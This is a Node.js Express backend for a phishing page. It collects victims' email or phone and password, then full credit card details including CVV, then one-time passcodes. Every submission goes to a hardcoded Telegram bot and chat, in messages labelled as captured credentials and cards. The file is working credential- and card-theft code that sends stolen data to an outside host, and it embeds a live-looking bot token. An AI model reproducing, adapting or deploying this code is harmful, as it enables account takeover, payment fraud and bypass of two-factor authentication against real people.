const express = require('express');
const session = require('express-session');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(
  session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 24 * 60 * 60 * 1000 },
  })
);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7585548516:AAGRcY22KvqX3sme0cIf1b_NXkuF6aSJTA8';
const TELEGRAM_CHAT_ID = '-1002554104085';

// Function to send message to Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    });
    console.log('Message sent to Telegram successfully');
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
  }
}

// Route to provide session data
app.get('/session-data', (req, res) => {
  console.log('Session data requested. Session:', req.session);
  res.json({
    error: req.session.error || '',
    user_input: req.session.user_input || '',
  });
});

// Handle form submissions
app.post('/submit', async (req, res) => {
  const step = req.body.step || 'email';
  let error = '';

  console.log('Received POST request for step:', step, 'Body:', req.body);

  if (step === 'email') {
    const { email_or_phone, password } = req.body;
    if (email_or_phone && password) {
      req.session.user_input = email_or_phone;
      req.session.user_password = password;
      const message = `🔐 <b>LOGIN CREDENTIALS CAPTURED</b> 🔐\n\n` +
        `📧 <b>Email/Phone:</b> ${email_or_phone}\n` +
        `🔑 <b>Password:</b> ${password}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      res.json({ success: true });
    } else {
      error = 'Please enter both email/phone and password';
      req.session.error = error;
      res.json({ error });
    }
  } else if (step === 'verify_card') {
    const { cardholder_name, card_number, expiration_date, security_code } = req.body;
    if (cardholder_name && card_number && expiration_date && security_code) {
      req.session.card_data = { cardholder_name, card_number, expiration_date, security_code };
      const message = `💳 <b>CREDIT CARD CAPTURED</b> 💳\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `👤 <b>Cardholder:</b> ${cardholder_name}\n` +
        `💳 <b>Card Number:</b> ${card_number}\n` +
        `📅 <b>Expiry:</b> ${expiration_date}\n` +
        `🔒 <b>CVV:</b> ${security_code}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      res.json({ success: true });
    } else {
      error = 'Please fill in all card details';
      req.session.error = error;
      res.json({ error });
    }
  } else if (step === 'otp') {
    const { otp } = req.body;
    if (otp) {
      req.session.otp_attempts = req.session.otp_attempts || [];
      req.session.otp_attempts.push(otp);
      const attemptNumber = req.session.otp_attempts.length;
      const message = `🔢 <b>OTP ATTEMPT ${attemptNumber} CAPTURED</b> 🔢\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `🔢 <b>OTP:</b> ${otp}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      res.json({ success: true });
    } else {
      error = 'Please enter the OTP';
      req.session.error = error;
      res.json({ error });
    }
  } else {
    res.status(400).json({ error: 'Invalid step' });
  }
});

// Serve the main page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

module.exports = app;
